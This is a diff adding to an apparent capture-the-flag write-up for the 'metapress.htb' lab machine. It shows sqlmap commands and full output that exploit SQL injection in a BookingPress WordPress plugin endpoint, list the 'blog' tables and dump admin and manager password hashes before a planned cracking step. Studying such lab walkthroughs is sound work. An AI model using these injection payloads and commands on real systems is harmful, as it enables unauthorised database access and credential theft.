@@ -319,3 +319,152 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 ```
 
 So now that sqlmap knows that it is vulnerable I, further, enumerated the database.
+
+```
+sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -- db
+```
+
+```
+┌──(darshan㉿kali)-[~]
+└─$ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -- db
+        ___
+       __H__                                                                                                                                           
+ ___ ___[']_____ ___ ___  {1.7.2#stable}                                                                                                               
+|_ -| . [']     | .'| . |                                                                                                                              
+|___|_  [']_|_|_|__,|  _|                                                                                                                              
+      |_|V...       |_|   https://sqlmap.org                                                                                                           
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:45:16 /2023-02-13/
+
+[10:45:16] [INFO] resuming back-end DBMS 'mysql' 
+[10:45:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: total_service (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND 1179=1179 AND (5714=5714
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND (SELECT 3708 FROM (SELECT(SLEEP(5)))gLML) AND (2888=2888
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x70536f744a6c56535468795050594841454258666b4a7a7257675a495659666d5a6b595466697348,0x71787a7671),NULL,NULL,NULL,NULL-- -
+---
+[10:45:17] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.0.24, Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[10:45:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'
+
+[*] ending @ 10:45:17 /2023-02-13/
+```
+
+Dumping tables in the Database `blog`
+
+```
+sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -D blog --tables
+```
+
+```
+┌──(darshan㉿kali)-[~]
+└─$ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -D blog --tables
+        ___
+       __H__                                                                                                                                           
+ ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                                                                               
+|_ -| . [,]     | .'| . |                                                                                                                              
+|___|_  [(]_|_|_|__,|  _|                                                                                                                              
+      |_|V...       |_|   https://sqlmap.org                                                                                                           
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:46:23 /2023-02-13/
+
+[10:46:23] [INFO] resuming back-end DBMS 'mysql' 
+[10:46:23] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: total_service (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND 1179=1179 AND (5714=5714
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND (SELECT 3708 FROM (SELECT(SLEEP(5)))gLML) AND (2888=2888
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x70536f744a6c56535468795050594841454258666b4a7a7257675a495659666d5a6b595466697348,0x71787a7671),NULL,NULL,NULL,NULL-- -
+---
+[10:46:24] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.18.0, PHP 8.0.24
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[10:46:24] [INFO] fetching tables for database: 'blog'
+Database: blog
+[27 tables]
++--------------------------------------+
+| wp_bookingpress_appointment_bookings |
+| wp_bookingpress_categories           |
+| wp_bookingpress_customers            |
+| wp_bookingpress_customers_meta       |
+| wp_bookingpress_customize_settings   |
+| wp_bookingpress_debug_payment_log    |
+| wp_bookingpress_default_daysoff      |
+| wp_bookingpress_default_workhours    |
+| wp_bookingpress_entries              |
+| wp_bookingpress_form_fields          |
+| wp_bookingpress_notifications        |
+| wp_bookingpress_payment_logs         |
+| wp_bookingpress_services             |
+| wp_bookingpress_servicesmeta         |
+| wp_bookingpress_settings             |
+| wp_commentmeta                       |
+| wp_comments                          |
+| wp_links                             |
+| wp_options                           |
+| wp_postmeta                          |
+| wp_posts                             |
+| wp_term_relationships                |
+| wp_term_taxonomy                     |
+| wp_termmeta                          |
+| wp_terms                             |
+| wp_usermeta                          |
+| wp_users                             |
++--------------------------------------+
+
+[10:46:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'
+
+[*] ending @ 10:46:24 /2023-02-13/
+
+
+```
+
+Dumping `wp_users` tables data
+
+```
+sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -D blog -T wp_users --dump
+```
+
+```
+Database: blog
+Table: wp_users
+[2 entries]
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
+| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+
+[11:15:30] [INFO] table 'blog.wp_users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/metapress.htb/dump/blog/wp_users.csv'
+[11:15:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'
+```
+
+Now, I found 2 users: `admin` & `manager` and got their password hashes too.
+
+So, i decided to use `John the ripper` to crack the password
+
